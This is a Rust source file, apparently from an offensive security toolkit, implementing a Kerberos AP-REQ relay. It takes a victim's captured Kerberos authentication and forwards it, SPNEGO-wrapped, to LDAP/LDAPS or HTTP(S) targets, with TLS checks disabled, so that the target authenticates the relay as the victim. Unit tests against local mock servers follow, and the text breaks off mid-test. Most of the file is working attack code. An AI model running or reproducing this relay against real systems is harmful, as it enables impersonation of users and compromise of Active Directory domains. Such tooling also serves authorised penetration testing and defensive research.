//! Kerberos AP-REQ relay (krbrelayx parity).
//!
//! Forwards a victim's Kerberos AP-REQ (obtained via the SMB daemon's
//! krb5-mech capture mode) to a target service so the target authenticates
//! the relay as the victim. Typical scenario: unconstrained delegation --
//! a victim hands the daemon a forwarded TGT which is replayed against
//! LDAP/HTTP targets.
//!
//! Outcomes are modelled as [`KrbRelayOutcome`]:
//! - `Completed`: target accepted the AP-REQ (SASL bind success / HTTP 2xx).
//! - `ContinuationNeeded`: target returned SPNEGO accept-incomplete
//!   (AP-REP) or HTTP 401 with a `Negotiate` challenge token. The token is
//!   returned so the caller can bridge it back to the original client.
//! - `Failed`: target rejected the AP-REQ (bind error, 403/500) or the
//!   protocol is not (yet) spoolable -- SMB targets need the full SMB2
//!   session-setup state machine and report an honest error.

use crate::{Protocol, RelayError, RelayTarget};
use base64::{Engine as _, engine::general_purpose::STANDARD as B64};
use std::net::SocketAddr;
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;

/// SPNEGO mechanism OID for the Kerberos 5 mech, in DER TLV form
/// (`06 09 2a 86 48 86 f7 12 01 02 02`).
const KRB5_MECH_OID_TLV: &[u8] = &[
    0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x12, 0x01, 0x02, 0x02,
];

/// SPNEGO top-level OID 1.3.6.1.5.5.2 in DER TLV form (`06 06 2b 06 01 05 05 02`).
const SPNEGO_OID_TLV: &[u8] = &[0x06, 0x06, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x02];

/// Result of forwarding one AP-REQ to a target.
#[derive(Debug)]
pub enum KrbRelayOutcome {
    /// Target authenticated the relay as the victim.
    Completed {
        target: RelayTarget,
        /// Human-readable confirmation (bind result code / HTTP status).
        detail: String,
    },
    /// Target requires one more leg; the token must be processed by the
    /// original client (or decrypted/verified offline).
    ContinuationNeeded {
        target: RelayTarget,
        /// AP-REP / SPNEGO responseToken from the target.
        token: Vec<u8>,
        detail: String,
    },
    /// Target rejected the AP-REQ or the protocol is unsupported.
    Failed { target: RelayTarget, reason: String },
}

impl KrbRelayOutcome {
    pub fn is_success(&self) -> bool {
        matches!(self, KrbRelayOutcome::Completed { .. })
    }

    pub fn summary(&self) -> String {
        match self {
            KrbRelayOutcome::Completed { target, detail } => {
                format!("{}: {}", target.address, detail)
            }
            KrbRelayOutcome::ContinuationNeeded { target, detail, .. } => {
                format!("{}: {}", target.address, detail)
            }
            KrbRelayOutcome::Failed { target, reason } => {
                format!("{} FAILED: {}", target.address, reason)
            }
        }
    }
}

// ===========================================================
// BER helpers (local, minimal -- mirrors relay.rs conventions)
// ===========================================================

fn ber_len_bytes(len: usize) -> Vec<u8> {
    if len < 128 {
        vec![len as u8]
    } else if len < 256 {
        vec![0x81, len as u8]
    } else if len < 65_536 {
        vec![0x82, (len >> 8) as u8, (len & 0xFF) as u8]
    } else {
        vec![
            0x83,
            (len >> 16) as u8,
            (len >> 8) as u8,
            (len & 0xFF) as u8,
        ]
    }
}

fn tlv(tag: u8, value: &[u8]) -> Vec<u8> {
    let mut out = vec![tag];
    out.extend_from_slice(&ber_len_bytes(value.len()));
    out.extend_from_slice(value);
    out
}

/// Read one BER TLV: (tag, value_start, value_end, next_start). None on
/// truncation or unsupported long-form lengths (> 4 bytes).
fn ber_read(data: &[u8], pos: usize) -> Option<(u8, usize, usize, usize)> {
    if pos >= data.len() {
        return None;
    }
    let tag = data[pos];
    let mut i = pos + 1;
    if i >= data.len() {
        return None;
    }
    let first = data[i];
    i += 1;
    let len: usize = if first & 0x80 == 0 {
        first as usize
    } else {
        let n = (first & 0x7F) as usize;
        if n == 0 || n > 4 || i + n > data.len() {
            return None;
        }
        let mut v = 0usize;
        for k in 0..n {
            v = (v << 8) | data[i + k] as usize;
        }
        i += n;
        v
    };
    if i + len > data.len() {
        return None;
    }
    Some((tag, i, i + len, i + len))
}

// ===========================================================
// SPNEGO wrapping / unwrapping
// ===========================================================

/// True when the blob is an SPNEGO FRAMED token (0x60 SEQUENCE carrying the
/// SPNEGO OID).
pub fn is_spnego_wrapped(blob: &[u8]) -> bool {
    if blob.len() < 10 || blob[0] != 0x60 {
        return false;
    }
    blob.windows(SPNEGO_OID_TLV.len() - 2)
        .any(|w| w == &SPNEGO_OID_TLV[2..])
}

/// True when the blob starts with a bare APPLICATION 14 AP-REQ TLV.
pub fn is_bare_apreq(blob: &[u8]) -> bool {
    blob.first() == Some(&0x6E)
}

/// Extract the mechToken (raw AP-REQ bytes) out of a SPNEGO negTokenInit.
/// Handles the common `A2 04 <token>` context form and the
/// `A2 .. 04 .. <token>` explicit OCTET STRING form.
pub fn extract_mech_token_from_spnego(blob: &[u8]) -> Option<Vec<u8>> {
    if !is_spnego_wrapped(blob) {
        return None;
    }
    let (tag, _vs, ve, _) = ber_read(blob, 0)?;
    if tag != 0x60 {
        return None;
    }
    let content = &blob[_vs..ve];
    // First TLV inside: OID
    let (_, _os, _oe, mut pos) = ber_read(content, 0)?;
    // Then either 0xA0 negTokenInit (init flow) or 0xA1 (resp flow)
    while pos < content.len() {
        let (t, s, _e, next) = ber_read(content, pos)?;
        pos = next;
        if t == 0xA0 {
            // negTokenInit: SEQUENCE { mechTypes OCTET.., ... mechToken [2] }
            let (it, is, ie, _) = ber_read(content, s)?;
            if it != 0x30 {
                continue;
            }
            let init_content = &content[is..ie];
            let mut ipos = 0usize;
            while ipos < init_content.len() {
                let (ct2, s2, e2, n2) = ber_read(init_content, ipos)?;
                ipos = n2;
                if ct2 == 0xA2 {
                    let token = &init_content[s2..e2];
                    if token.first() == Some(&0x04) {
                        let (_t4, s4, e4, _) = ber_read(token, 0)?;
                        return Some(token[s4..e4].to_vec());
                    }
                    return Some(token.to_vec());
                }
            }
        } else if t == 0xA1 {
            // negTokenResp: responseToken is [2] (0xA2)
            let (it, is, ie, _) = ber_read(content, s)?;
            if it != 0x30 {
                continue;
            }
            let resp_content = &content[is..ie];
            let mut ipos = 0usize;
            while ipos < resp_content.len() {
                let (ct2, s2, e2, n2) = ber_read(resp_content, ipos)?;
                ipos = n2;
                if ct2 == 0xA2 {
                    let token = &resp_content[s2..e2];
                    if token.first() == Some(&0x04) {
                        let (_t4, s4, e4, _) = ber_read(token, 0)?;
                        return Some(token[s4..e4].to_vec());
                    }
                    return Some(token.to_vec());
                }
            }
        }
    }
    None
}

/// Normalise daemon-captured security-buffer bytes to the bare AP-REQ:
/// accepts APPLICATION 14 blobs directly and SPNEGO negTokenInit wrapped
/// blobs (extracts the mechToken).
pub fn to_bare_apreq(sec_data: &[u8]) -> Option<Vec<u8>> {
    if is_bare_apreq(sec_data) {
        return Some(sec_data.to_vec());
    }
    extract_mech_token_from_spnego(sec_data)
        .filter(|t| is_bare_apreq(t) || t.first() == Some(&0x6A))
}

/// Wrap a bare AP-REQ in SPNEGO negTokenInit advertising the krb5 mech:
/// `60 [spnego OID] [A0 30 [30 mechTypes krb5] [A2 mechToken]]`.
pub fn spnego_wrap_kerberos(bare_apreq: &[u8]) -> Vec<u8> {
    let mech_types = tlv(0x30, KRB5_MECH_OID_TLV);
    let mech_token = tlv(0xA2, bare_apreq);
    let init_inner = [mech_types.as_slice(), mech_token.as_slice()].concat();
    let init_seq = tlv(0x30, &init_inner);
    let neg_token_init = tlv(0xA0, &init_seq);
    let outer_inner = [SPNEGO_OID_TLV, neg_token_init.as_slice()].concat();
    tlv(0x60, &outer_inner)
}

/// True when the token looks like a Kerberos AP-REQ wrapped or bare
/// (krb_capture scan is authoritative but needs parseable structure).
pub fn looks_like_apreq(sec_data: &[u8]) -> bool {
    if is_bare_apreq(sec_data) {
        return true;
    }
    if let Some(token) = extract_mech_token_from_spnego(sec_data) {
        return is_bare_apreq(&token);
    }
    false
}

// ===========================================================
// SPNEGO continuation-state parsing (negTokenResp)
// ===========================================================

/// SPNEGO negotiation state carried in negTokenResp negState [0]
/// ENUMERATED per RFC 4178 section 5: 0 accept-completed,
/// 1 accept-incomplete, 2 reject, 3 request-mic.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SpnegoState {
    AcceptCompleted,
    AcceptIncomplete,
    Reject,
    RequestMic,
}

impl SpnegoState {
    fn from_code(code: i64) -> Option<Self> {
        match code {
            0 => Some(Self::AcceptCompleted),
            1 => Some(Self::AcceptIncomplete),
            2 => Some(Self::Reject),
            3 => Some(Self::RequestMic),
            _ => None,
        }
    }
}

/// Parse a SASL credential blob from an LDAP bind (or HTTP WWW-Authenticate
/// continuation) and return (state, responseToken).
pub fn parse_neg_token_resp(blob: &[u8]) -> Option<(SpnegoState, Option<Vec<u8>>)> {
    // Accept A1-prefixed negTokenResp directly, or a 0x60 SPNEGO frame
    // holding an A1 negTokenResp, or (tolerant) scan the first bytes.
    let scan: &[u8] = if blob.first() == Some(&0xA1) {
        blob
    } else if is_spnego_wrapped(blob) {
        // locate the A1 inside
        let (_, s, e, _) = ber_read(blob, 0)?;
        &blob[s..e]
    } else {
        blob
    };
    // find a leading A1
    let mut pos = 0usize;
    while pos < scan.len() {
        let (t, s, _e, next) = ber_read(scan, pos)?;
        pos = next;
        if t != 0xA1 {
            continue;
        }
        let (st, ss, se, _) = ber_read(scan, s)?;
        if st != 0x30 {
            continue;
        }
        let inner = &scan[ss..se];
        let mut ipos = 0usize;
        let mut state: Option<SpnegoState> = None;
        let mut token: Option<Vec<u8>> = None;
        while ipos < inner.len() {
            let (ct, cs, ce, cn) = ber_read(inner, ipos)?;
            ipos = cn;
            match ct {
                0xA0 => {
                    // ENUMERATED value
                    let content = &inner[cs..ce];
                    if let Some((0x0A, vs, ve, _)) = ber_read(content, 0) {
                        let mut v: i64 = 0;
                        let neg = content[vs] & 0x80 != 0;
                        for b in &content[vs..ve] {
                            v = (v << 8) | *b as i64;
                        }
                        if neg {
                            v -= 1i64 << (8 * content[vs..ve].len() as u32);
                        }
                        state = SpnegoState::from_code(v);
                    }
                }
                0xA2 => token = Some(inner[cs..ce].to_vec()),
                _ => {}
            }
        }
        if let Some(state) = state {
            return Some((state, token));
        }
        return Some((SpnegoState::Reject, token));
    }
    None
}

// ===========================================================
// LDAP target
// ===========================================================

/// Forward an AP-REQ to an LDAP/LDAPS target as a GSS-SPNEGO SASL bind.
pub async fn relay_kerberos_to_ldap(
    addr: SocketAddr,
    use_ldaps: bool,
    bare_apreq: &[u8],
    timeout: Duration,
) -> Result<KrbRelayOutcome, RelayError> {
    let target = RelayTarget {
        address: addr,
        protocol: if use_ldaps {
            Protocol::Ldaps
        } else {
            Protocol::Ldap
        },
        username: None,
    };

    let spnego = spnego_wrap_kerberos(bare_apreq);
    let bind_pdu = build_ldap_spnego_bind(&spnego, 1);

    let tcp = tokio::time::timeout(timeout, TcpStream::connect(addr))
        .await
        .map_err(|_| RelayError::Connection(format!("LDAP connect timeout {}", addr)))?
        .map_err(|e| RelayError::Network(format!("LDAP connect {}: {}", addr, e)))?;

    let mut stream: Box<dyn crate::relay::RelayIo> = if use_ldaps {
        let hostname = addr.ip().to_string();
        Box::new(
            crate::tls::wrap_tls(
                tcp,
                hostname,
                crate::tls::TlsVerificationMode::AcceptAll,
                None,
            )
            .await
            .map_err(|e| RelayError::Network(format!("LDAPS TLS: {}", e)))?,
        )
    } else {
        Box::new(tcp)
    };

    tokio::time::timeout(timeout, stream.write_all(&bind_pdu))
        .await
        .map_err(|_| RelayError::Connection("LDAP bind write timeout".into()))?
        .map_err(|e| RelayError::Network(format!("LDAP bind write: {}", e)))?;

    let mut buf = vec![0u8; 65_536];
    let n = tokio::time::timeout(timeout, stream.read(&mut buf))
        .await
        .map_err(|_| RelayError::Connection("LDAP bind response timeout".into()))?
        .map_err(|e| RelayError::Network(format!("LDAP bind read: {}", e)))?;
    if n == 0 {
        return Ok(KrbRelayOutcome::Failed {
            target,
            reason: "LDAP target closed connection on bind".into(),
        });
    }
    let response = &buf[..n];

    // Extract optional serverSaslCreds (context tag 7, 0x8B) before the
    // generic bind-result parse.
    let sasl_creds = extract_server_sasl_creds(response);

    let rc = crate::relay::parse_ldap_bind_result(response)
        .map_err(|e| RelayError::Protocol(format!("LDAP bind parse: {}", e)))?;
    if rc != 0 {
        return Ok(KrbRelayOutcome::Failed {
            target,
            reason: format!("LDAP bind rejected the AP-REQ (resultCode {})", rc),
        });
    }

    let sasl_decision = sasl_creds.as_deref().and_then(parse_neg_token_resp);
    if let Some((state, token)) = sasl_decision {
        return match state {
            SpnegoState::AcceptCompleted => Ok(KrbRelayOutcome::Completed {
                target,
                detail: "LDAP SASL GSS-SPNEGO accept-completed (AP-REQ accepted)".into(),
            }),
            SpnegoState::AcceptIncomplete => match token {
                Some(tok) => Ok(KrbRelayOutcome::ContinuationNeeded {
                    target,
                    token: tok,
                    detail: "LDAP SASL accept-incomplete -- AP-REP continuation token".into(),
                }),
                None => Ok(KrbRelayOutcome::Failed {
                    target,
                    reason: "LDAP SASL accept-incomplete without continuation token".into(),
                }),
            },
            SpnegoState::Reject => Ok(KrbRelayOutcome::Failed {
                target,
                reason: "LDAP SASL negTokenResp: SPNEGO reject".into(),
            }),
            SpnegoState::RequestMic => Ok(KrbRelayOutcome::Failed {
                target,
                reason: "LDAP SASL requested MIC (channel-binding) -- relay rejected".into(),
            }),
        };
    }

    Ok(KrbRelayOutcome::Completed {
        target,
        detail: format!(
            "LDAP bind success (resultCode 0), no SPNEGO continuation ({} bytes)",
            n
        ),
    })
}

/// Build an LDAP SASL bind with mechanism "GSS-SPNEGO" and the given
/// SPNEGO token as credentials (mirrors relay::build_ldap_sasl_bind with a
/// blob originating from a Kerberos AP-REQ).
fn build_ldap_spnego_bind(spnego: &[u8], message_id: u32) -> Vec<u8> {
    crate::relay::build_ldap_sasl_bind(spnego, message_id)
}

/// Locate an LDAP BindResponse's serverSaslCreds ([7] primitive, 0x8B).
fn extract_server_sasl_creds(response: &[u8]) -> Option<Vec<u8>> {
    // LDAPMessage = SEQUENCE { msgid INTEGER, [APPLICATION 1] BindResponse
    // { ... [7] serverSaslCreds } }. Descend outer 0x30 -> 0x61 -> 0x8B.
    let (top, ts, te, _) = ber_read(response, 0)?;
    let content = if top == 0x30 {
        &response[ts..te]
    } else {
        response
    };
    let mut pos = 0usize;
    while pos < content.len() {
        let (tag, s, e, next) = ber_read(content, pos)?;
        pos = next;
        if tag != 0x61 {
            continue;
        }
        let mut ipos = s;
        while ipos < e {
            let (it, is2, ie, inext) = ber_read(content, ipos)?;
            ipos = inext;
            if it == 0x8B {
                return Some(content[is2..ie].to_vec());
            }
        }
    }
    None
}

// ===========================================================
// HTTP / HTTPS target
// ===========================================================

/// Forward an AP-REQ to an HTTP(S) target via an `Authorization: Negotiate`
/// header. 2xx/3xx = completed, 401 + `WWW-Authenticate: Negotiate <token>`
/// = continuation, anything else = failure.
pub async fn relay_kerberos_to_http(
    addr: SocketAddr,
    use_tls: bool,
    path: &str,
    bare_apreq: &[u8],
    timeout: Duration,
) -> Result<KrbRelayOutcome, RelayError> {
    let target = RelayTarget {
        address: addr,
        protocol: if use_tls {
            Protocol::Https
        } else {
            Protocol::Http
        },
        username: None,
    };

    let spnego = spnego_wrap_kerberos(bare_apreq);
    let req = format!(
        "GET {} HTTP/1.1\r\nHost: {}\r\nAuthorization: Negotiate {}\r\nUser-Agent: Mozilla/5.0 (Overthrone)\r\nConnection: close\r\n\r\n",
        if path.is_empty() { "/" } else { path },
        addr,
        B64.encode(&spnego)
    )
    .into_bytes();

    let tcp = tokio::time::timeout(timeout, TcpStream::connect(addr))
        .await
        .map_err(|_| RelayError::Connection(format!("HTTP connect timeout {}", addr)))?
        .map_err(|e| RelayError::Network(format!("HTTP connect {}: {}", addr, e)))?;

    if use_tls {
        let hostname = addr.ip().to_string();
        let mut tls = crate::tls::wrap_tls(
            tcp,
            hostname,
            crate::tls::TlsVerificationMode::AcceptAll,
            None,
        )
        .await
        .map_err(|e| RelayError::Network(format!("HTTPS TLS: {}", e)))?;
        tokio::time::timeout(timeout, tls.write_all(&req))
            .await
            .map_err(|_| RelayError::Connection("HTTP request write timeout".into()))?
            .map_err(|e| RelayError::Network(format!("HTTP request write: {}", e)))?;
        let mut buf = vec![0u8; 65_536];
        let n = tokio::time::timeout(timeout, tls.read(&mut buf))
            .await
            .map_err(|_| RelayError::Connection("HTTP response read timeout".into()))?
            .map_err(|e| RelayError::Network(format!("HTTP response read: {}", e)))?;
        parse_http_outcome(&buf[..n], target)
    } else {
        let mut stream = tcp;
        tokio::time::timeout(timeout, stream.write_all(&req))
            .await
            .map_err(|_| RelayError::Connection("HTTP request write timeout".into()))?
            .map_err(|e| RelayError::Network(format!("HTTP request write: {}", e)))?;
        let mut buf = vec![0u8; 65_536];
        let n = tokio::time::timeout(timeout, stream.read(&mut buf))
            .await
            .map_err(|_| RelayError::Connection("HTTP response read timeout".into()))?
            .map_err(|e| RelayError::Network(format!("HTTP response read: {}", e)))?;
        parse_http_outcome(&buf[..n], target)
    }
}

fn parse_http_outcome(response: &[u8], target: RelayTarget) -> Result<KrbRelayOutcome, RelayError> {
    let text = String::from_utf8_lossy(response);
    let first_line = text.lines().next().unwrap_or("");
    let status: u16 = first_line
        .split_whitespace()
        .nth(1)
        .and_then(|s| s.parse().ok())
        .unwrap_or(0);

    if (200..400).contains(&status) && status != 0 {
        return Ok(KrbRelayOutcome::Completed {
            target,
            detail: format!("HTTP {} {} (Negotiate AP-REQ accepted)", status, first_line),
        });
    }
    if status == 401 {
        // WWW-Authenticate: Negotiate <b64 token>
        for line in text.lines() {
            let lower = line.to_lowercase();
            if !(lower.starts_with("www-authenticate:") && lower.contains("negotiate")) {
                continue;
            }
            let b64_token = line
                .splitn(2, ' ')
                .last()
                .unwrap_or("")
                .trim()
                .trim_start_matches("Negotiate ")
                .trim();
            let decoded = B64.decode(b64_token).ok().filter(|t| !t.is_empty());
            if let Some(tok) = decoded {
                let tok_len = tok.len();
                return Ok(KrbRelayOutcome::ContinuationNeeded {
                    target,
                    token: tok,
                    detail: format!("HTTP 401 Negotiate continuation ({} bytes)", tok_len),
                });
            }
        }
        return Ok(KrbRelayOutcome::Failed {
            target,
            reason: format!("HTTP 401 without Negotiate token ({})", first_line),
        });
    }
    Ok(KrbRelayOutcome::Failed {
        target,
        reason: format!("HTTP status {} ({})", status, first_line),
    })
}

// ===========================================================
// Dispatcher
// ===========================================================

/// Relay one captured AP-REQ to `target` per its protocol.
/// Supported: LDAP, LDAPS, HTTP, HTTPS. Other protocols (SMB, MSSQL, ...)
/// return `Failed` with an explicit unsupported-reason (SMB AP-REQ relays
/// require the SMB2 session-setup state machine -- see smb_daemon Relay
/// mode for the NTLM flavour).
pub async fn relay_kerberos(
    target: &RelayTarget,
    raw_auth_blob: &[u8],
    timeout: Duration,
) -> KrbRelayOutcome {
    let bare = match to_bare_apreq(raw_auth_blob) {
        Some(b) => b,
        None => {
            return KrbRelayOutcome::Failed {
                target: target.clone(),
                reason: "auth blob contains no AP-REQ (neither bare APPLICATION 14 nor SPNEGO-wrapped) -- use --krb-relay only with Kerberos captures"
                    .into(),
            }
        }
    };
    match target.protocol {
        Protocol::Ldap | Protocol::Ldaps => {
            let use_ldaps = target.protocol == Protocol::Ldaps;
            match relay_kerberos_to_ldap(target.address, use_ldaps, &bare, timeout).await {
                Ok(outcome) => outcome,
                Err(e) => KrbRelayOutcome::Failed {
                    target: target.clone(),
                    reason: format!("{}", e),
                },
            }
        }
        Protocol::Http | Protocol::Https => {
            let use_tls = target.protocol == Protocol::Https;
            match relay_kerberos_to_http(target.address, use_tls, "/", &bare, timeout).await {
                Ok(outcome) => outcome,
                Err(e) => KrbRelayOutcome::Failed {
                    target: target.clone(),
                    reason: format!("{}", e),
                },
            }
        }
        other => KrbRelayOutcome::Failed {
            target: target.clone(),
            reason: format!(
                "{} relay not implemented for Kerberos AP-REQ forwarding; supported: ldap/ldaps/http/https",
                other
            ),
        },
    }
}

// ===========================================================
// Tests
// ===========================================================

#[cfg(test)]
mod tests {
    use super::*;
    use tokio::io::AsyncWriteExt;

    fn bare_apreq_fixture() -> Vec<u8> {
        // Any byte pattern shaped like a parsable AP-REQ is enough for the
        // wrapping tests (dy -> 0x6E APPLICATION 14 TLV of an inner SEQ).
        let mut v = vec![
            0x6E, 0x09, 0x30, 0x07, 0xA0, 0x03, 0x02, 0x01, 0x05, 0xFF, 0xFF,
        ];
        v.push(0x00);
        v
    }

    #[test]
    fn test_spnego_wrap_kerberos_structure() {
        let bare = bare_apreq_fixture();
        let wrapped = spnego_wrap_kerberos(&bare);
        assert_eq!(wrapped[0], 0x60, "outer SPNEGO SEQUENCE");
        // token ends where the length field says
        let len = wrapped[1] as usize;
        assert_eq!(wrapped.len(), 2 + len);
        // SPNEGO OID present
        assert!(
            wrapped
                .windows(6)
                .any(|w| w == [0x2b, 0x06, 0x01, 0x05, 0x05, 0x02])
        );
        // mechTypes list advertises krb5 OID
        assert!(
            wrapped.windows(3).any(|w| w == [0x06, 0x09, 0x2a]),
            "krb5 mech OID advertised"
        );
        // mechToken A2 present and holds the bare AP-REQ
        assert!(wrapped.windows(2).any(|w| w == [0xA2, bare.len() as u8]));
    }

    #[test]
    fn test_spnego_roundtrip() {
        let bare = bare_apreq_fixture();
        let wrapped = spnego_wrap_kerberos(&bare);
        let extracted = extract_mech_token_from_spnego(&wrapped).expect("mech token extracted");
        assert_eq!(extracted, bare, "roundtrip preserves the AP-REQ bytes");
    }

    #[test]
    fn test_is_spnego_wrapped_and_bare() {
        let bare = bare_apreq_fixture();
        let wrapped = spnego_wrap_kerberos(&bare);
        assert!(is_spnego_wrapped(&wrapped));
        assert!(!is_spnego_wrapped(&bare));
        assert!(is_bare_apreq(&bare));
        assert!(!is_bare_apreq(&wrapped));
    }

    #[test]
    fn test_to_bare_apreq_variants() {
        let bare = bare_apreq_fixture();
        let wrapped = spnego_wrap_kerberos(&bare);
        assert_eq!(to_bare_apreq(&bare), Some(bare.clone()));
        assert_eq!(to_bare_apreq(&wrapped), Some(bare));
        assert_eq!(to_bare_apreq(b"garbage-not-spnego"), None);
    }

    #[test]
    fn test_looks_like_apreq() {
        let bare = bare_apreq_fixture();
        let wrapped = spnego_wrap_kerberos(&bare);
        assert!(looks_like_apreq(&bare));
        assert!(looks_like_apreq(&wrapped));
        assert!(!looks_like_apreq(b"plain-ntlm-token"));
        assert!(!looks_like_apreq(b""));
    }

    // -------------------------------------------------------
    // negTokenResp state parsing (mock LDAP SASL blob)
    // -------------------------------------------------------

    fn neg_token_resp(state_code: u8, token: Option<&[u8]>) -> Vec<u8> {
        let state_tlv = tlv(0xA0, &[0x0A, 0x01, state_code]);
        let body = match token {
            Some(tok) => {
                let tok_tlv = tlv(0xA2, tok);
                [state_tlv.as_slice(), tok_tlv.as_slice()].concat()
            }
            None => state_tlv,
        };
        tlv(0xA1, &tlv(0x30, &body))
    }

    #[test]
    fn test_parse_neg_token_resp_accept_completed() {
        let blob = neg_token_resp(0, None);
        let (state, token) = parse_neg_token_resp(&blob).expect("state parsed");
        assert_eq!(state, SpnegoState::AcceptCompleted);
        assert!(token.is_none());
    }

    #[test]
    fn test_parse_neg_token_resp_async_token() {
        let ap_rep = vec![0x6F, 0x04, 0x01, 0x02, 0x03, 0x04];
        let blob = neg_token_resp(1, Some(&ap_rep));
        let (state, token) = parse_neg_token_resp(&blob).expect("state parsed");
        assert_eq!(state, SpnegoState::AcceptIncomplete);
        assert_eq!(token.as_deref(), Some(ap_rep.as_slice()));
    }

    #[test]
    fn test_parse_neg_token_resp_reject() {
        let blob = neg_token_resp(2, None);
        let (state, _token) = parse_neg_token_resp(&blob).expect("state parsed");
        assert_eq!(state, SpnegoState::Reject);
    }

    #[test]
    fn test_parse_neg_token_resp_wrapped_in_spnego_frame() {
        // servers often frame the resp inside 0x60 + OID
        let inner = neg_token_resp(0, Some(b"MIC"));
        let outer = tlv(0x60, &[SPNEGO_OID_TLV, inner.as_slice()].concat());
        let (state, token) = parse_neg_token_resp(&outer).expect("state parsed");
        assert_eq!(state, SpnegoState::AcceptCompleted);
        assert_eq!(token.as_deref(), Some(b"MIC".as_slice()));
    }

    // -------------------------------------------------------
    // Mock LDAP target
    // -------------------------------------------------------

    /// Build an LDAPMessage: SEQUENCE { msgid INTEGER, [APP 1] bindResponse {
    /// ENUM rc, 04 matchedDN, 04 diag, [7] (0x8B) saslCreds } }.
    fn ldap_bind_response(rc: u8, sasl_creds: Option<&[u8]>) -> Vec<u8> {
        let mut bind_inner = vec![0x0A, 0x01, rc, 0x04, 0x00, 0x04, 0x00];
        if let Some(creds) = sasl_creds {
            bind_inner.extend_from_slice(&tlv(0x8B, creds));
        }
        let bind_tlv = tlv(0x61, &bind_inner);
        let msgid = tlv(0x02, &[0x01]);
        let msg_inner = [msgid.as_slice(), bind_tlv.as_slice()].concat();
        tlv(0x30, &msg_inner)
    }

    #[tokio::test]
    async fn test_relay_kerberos_to_ldap_mock_completed() {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();

        let server = tokio::spawn(async move {
            let (mut sock, _) = listener.accept().await.unwrap();
            let mut buf = vec![0u8; 4096];
            let n = sock.read(&mut buf).await.unwrap();
            // client bind must carry the SPNEGO blob (GSS-SPNEGO mechanism)
            let req = &buf[..n];
            assert!(
                req.windows(10).any(|w| w == b"GSS-SPNEGO"),
                "SASL mechanism GSS-SPNEGO in bind"
            );
            // the credentials hold our wrapped AP-REQ
            let bare = bare_apreq_fixture();
            assert!(
                req.windows(bare.len()).any(|w| w == bare.as_slice()),
                "AP-REQ forwarded inside credential blob"
            );
            let resp = ldap_bind_response(0, Some(&neg_token_resp(0, None)));
            sock.write_all(&resp).await.unwrap();
        });

        let outcome =
            relay_kerberos_to_ldap(addr, false, &bare_apreq_fixture(), Duration::from_secs(5))
                .await
                .expect("no transport error");
        assert!(
            outcome.is_success(),
            "expected Completed: {:?}",
            outcome.summary()
        );
        server.await.unwrap();
    }

    #[tokio::test]
    async fn test_relay_kerberos_to_ldap_mock_continuation() {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();

        let ap_rep = vec![0x6F, 0x08, 0xA1, 0x82, 0x00, 0x00];
        let ap_rep_expected = ap_rep.clone();
        let server = tokio::spawn(async move {
            let (mut sock, _) = listener.accept().await.unwrap();
            let mut buf = vec![0u8; 4096];
            sock.read(&mut buf).await.unwrap();
            let resp = ldap_bind_response(0, Some(&neg_token_resp(1, Some(&ap_rep))));
            sock.write_all(&resp).await.unwrap();
        });

        let outcome =
            relay_kerberos_to_ldap(addr, false, &bare_apreq_fixture(), Duration::from_secs(5))
                .await
                .expect("no transport error");
        match outcome {
            KrbRelayOutcome::ContinuationNeeded { token, .. } => {
                assert_eq!(token, ap_rep_expected, "AP-REP continuation token surfaced");
            }
            other => panic!("expected ContinuationNeeded, got {:?}", other.summary()),
        }
        server.await.unwrap();
    }

    #[tokio::test]
    async fn test_relay_kerberos_to_ldap_mock_rejected() {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();

        let server = tokio::spawn(async move {
            let (mut sock, _) = listener.accept().await.unwrap();
            let mut buf = vec![0u8; 4096];
            sock.read(&mut buf).await.unwrap();
            let resp = ldap_bind_response(49, None);
            sock.write_all(&resp).await.unwrap();
        });

        let outcome =
            relay_kerberos_to_ldap(addr, false, &bare_apreq_fixture(), Duration::from_secs(5))
                .await
                .expect("no transport error");
        match outcome {
            KrbRelayOutcome::Failed { reason, .. } => {
                assert!(reason.contains("49"), "bind rc present: {reason}");
            }
            other => panic!("expected Failed, got {:?}", other.summary()),
        }
        server.await.unwrap();
    }

    // -------------------------------------------------------
    // Mock HTTP target
    // -------------------------------------------------------

    #[tokio::test]
    async fn test_relay_kerberos_to_http_mock_completed() {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();

        let server = tokio::spawn(async move {
            let (mut sock, _) = listener.accept().await.unwrap();
            let mut buf = vec![0u8; 4096];
            let n = sock.read(&mut buf).await.unwrap();
            let req = String::from_utf8_lossy(&buf[..n]);
            assert!(req.starts_with("GET / HTTP/1.1"));
            assert!(
                req.to_lowercase().contains("authorization: negotiate "),
                "Negotiate header present"
            );
            // keep the connection until the client saw the response
            let resp = b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
            sock.write_all(resp).await.unwrap();
        });

        let outcome = relay_kerberos_to_http(
            addr,
            false,
            "/",
            &bare_apreq_fixture(),
            Duration::from_secs(5),
        )
        .await
        .expect("no transport error");
        assert!(
            outcome.is_success(),
            "expected Completed: {:?}",
            outcome.summary()
        );
        server.await.unwrap();
    }

    #[tokio::test]
    async fn test_relay_kerberos_to_http_mock_continuation() {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();

        let ap_rep_b64 = base64::engine::general_purpose::STANDARD.encode([0x6F, 0x08, 0x00]);
        let server = tokio::spawn(async move {
            let (mut sock, _) = listener.accept().await.unwrap();
            let mut buf = vec![0u8; 4096];
            sock.read(&mut buf).await.unwrap();
            let resp = format!(
                "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: Negotiate {}\r\nContent-Length: 0\r\n\r\n",
                ap_rep_b64
            );
            sock.write_all(resp.as_bytes()).await.unwrap();
        });

        let outcome = relay_kerberos_to_http(
            addr,
            false,
            "/",
            &bare_apreq_fixture(),
            Duration::from_secs(5),
        )
        .await
        .expect("no transport error");
        match outcome {
            KrbRelayOutcome::ContinuationNeeded { token, .. } => {
                assert!(!token.is_empty());
            }
